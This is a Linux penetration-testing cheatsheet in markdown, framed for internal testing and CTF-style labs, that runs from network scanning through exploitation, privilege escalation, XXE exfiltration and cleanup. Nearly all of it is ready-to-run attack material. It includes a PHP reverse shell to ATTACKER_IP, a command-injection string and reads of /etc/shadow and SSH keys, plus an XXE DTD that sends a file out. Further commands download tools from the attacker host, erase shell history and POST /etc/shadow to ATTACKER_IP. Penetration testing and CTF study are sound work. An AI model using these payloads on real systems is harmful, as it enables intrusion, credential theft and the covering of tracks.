# 🛡️ Penetration Testing Cheatsheet

A step-by-step walkthrough covering reconnaissance, exploitation, privilege escalation, post-exploitation, and exfiltration. Designed for both internal testing and CTF-like environments.

---

## 🔍 1. Reconnaissance

### 📌 Network Scanning (with Nmap)
```bash
nmap -p- -sV -sC -T4 -oN full-scan.txt 10.10.10.10
nmap -F -oN fast-scan.txt 10.10.10.10
```

### 📌 Ping Sweep
```bash
fping -a -g 10.10.10.0/24
```

### 📌 DNS Enumeration
```bash
dig axfr @ns1.victim.com victim.com
dnsrecon -d victim.com
```

### 📌 Subdomain Brute-force
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://victim.com -H "Host: FUZZ.victim.com"
```

---

## 🌐 2. Enumeration

### 📌 HTTP Enumeration
```bash
whatweb http://victim.com
nikto -h http://victim.com
gobuster dir -u http://victim.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### 📌 SMB Enumeration
```bash
enum4linux -a 10.10.10.10
smbclient -L //10.10.10.10/ -N
```

### 📌 FTP
```bash
ftp 10.10.10.10
```

### 📌 SNMP
```bash
snmpwalk -v2c -c public 10.10.10.10
```

---

## 💥 3. Exploitation

### 📌 Search for Exploits
```bash
searchsploit <service>
msfconsole
# > search <service>
```

### 📌 Manual Command Injection
```bash
127.0.0.1; whoami
```

### 📌 Reverse Shell (PHP)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

### 📌 Start Listener
```bash
nc -lvnp 4444
```

---

## 🔑 4. Credentials & Files

### 📌 Common Files
```bash
cat /etc/passwd
cat /etc/shadow
ls -la ~/.ssh/
cat ~/.bash_history
```

### 📌 Hash Cracking
```bash
unshadow passwd shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 🪜 5. Privilege Escalation

### 📌 LinPEAS
```bash
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 📌 Sudo & SUID
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

### 📌 GTFOBins
- https://gtfobins.github.io/

---

## 🌐 6. XXE (OOB Exfil)

### external.dtd
```dtd
<!ENTITY % file SYSTEM "file:///root/oob.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/?x=%file;'>">
%eval;
%exfil;
```

### Malicious XML
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP/external.dtd">
  %remote;
]>
<data>&exfil;</data>
```

### Serve + Capture
```bash
python3 -m http.server 80
nc -lvnp 8000
```

---

## 🧹 7. Post Exploitation

### 📌 Pivot, Transfer, Cleanup
```bash
sudo -u <user> /bin/bash
python3 -m http.server 8000
wget http://ATTACKER_IP:8000/linpeas.sh
history -c
```

---

## 📤 8. Exfiltration
```bash
curl -X POST -F 'file=@/etc/shadow' http://ATTACKER_IP/upload
```

---

## 🛠️ Wordlists & Tools

- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/`
- Tools: Nmap, Gobuster, Burp, LinPEAS, John, FFUF, Metasploit, etc.

---

## 🧠 Pro Tips

- Start with full TCP scan.
- Always enumerate before exploiting.
- Check for backups, dev notes, `.git`, and `.env`.
